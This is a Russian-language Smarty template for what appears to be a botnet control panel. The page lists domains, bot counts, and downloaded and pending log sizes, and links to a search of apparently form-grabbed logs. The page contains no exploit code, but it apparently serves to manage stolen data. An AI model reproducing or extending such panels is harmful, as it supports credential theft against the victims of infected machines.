<div class="top_menu">

<div class="top_menu_left"><a href="#" onclick="update();">Обновить</a>&nbsp;{if $pid_downloads ne true}<a href="/files/index.html?x=download">Запустить загрузку</a>&nbsp;{/if}</div>

<div class="top_menu_right">
{if $smarty.session.user->access.files.search eq on}<a href="/files/search.html"{if $Cur.go eq 'search'} style="color:red"{/if}>Поиск в логах ФГ</a>&nbsp;{/if}
{if $smarty.session.user->access.files.filters eq on}<a href="/files/filters.html"{if $Cur.go eq 'search'} style="color:red"{/if}>Фильтры</a>&nbsp;{/if}
</div>

</div>
<hr />

{if $speed}<div style="font-size:11px; font-weight:bold; color:#000066" align="center">
Средняя скорость<br /><br />
{$speed.ft}<br /><br />
Вход: {$speed.rx} / сек ({$speed.rxb} / сек)<br />
Исход: {$speed.tx} / сек ({$speed.txb} / сек)<br />
</div>{/if}

{if $files|@count gt 0}
<!--div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div-->
<hr />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bg4" style="border: 1px solid #FFFFFF; height: 25px; font-size:13px">
	<th style="width:250px;">Домен</th>
    <th style="width:100px;">Ботов</th>
    <th style="width:150px;" title="Размер логов (скачанных / не скачанных)">Размер логов</th>
    <th style="width:100px;">Проценты</th>
    <th style="width:100px;" title="Средняя скорость загрузки файлов">Скорость</th>
</tr>
{foreach from=$files item=adm name=admins}
{if $smarty.foreach.admins.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF">
	<th>{if $adm.link}{$adm.link}{else}unknow ({$adm.id}){/if}</th>
	<th>{if $adm.link}{$adm.count_bots}{else}-{/if}</th>
    <th style="font-size:10px" title="{$adm.s3|@size_format}">{$adm.s2|@size_format} / {$adm.s1|@size_format}</th>
    <th style="font-size:10px">{if $adm.s1 ne ''}{math equation="(x / y) * 100" x=$adm.s2 y=$adm.s3 format="%.2f"}{else}100.00{/if}%</th>
    <th style="font-size:10px">{if $sdf[$adm.id] ne ''}{$sdf[$adm.id]|@size_format} / сек{else} - {/if}</th>
</tr>
{/foreach}
<tr class="bgp3" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp3'" style="border: 1px solid #FFFFFF">
	<th>&nbsp;</th>
	<th>{$sizes.count_bots}</th>
    <th style="font-size:10px" title="{$sizes.s3|@size_format}">{$sizes.s2|@size_format} / {$sizes.s1|@size_format}</th>
    <th style="font-size:10px">{if $sizes.s1 ne ''}{math equation="(x / y) * 100" x=$sizes.s2 y=$sizes.s3 format="%.2f"}{else}100.00{/if}%</th>
    <th style="font-size:10px">{if $sdf.all ne ''}{$sdf.all|@size_format} / сек{else} - {/if}</th>
</tr>
</table>
<hr />
<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>
{else}
<hr />
<div style="text-align:center; font-size:14px; font-weight:bold">Админок не найдено!</div>
<hr />
{/if}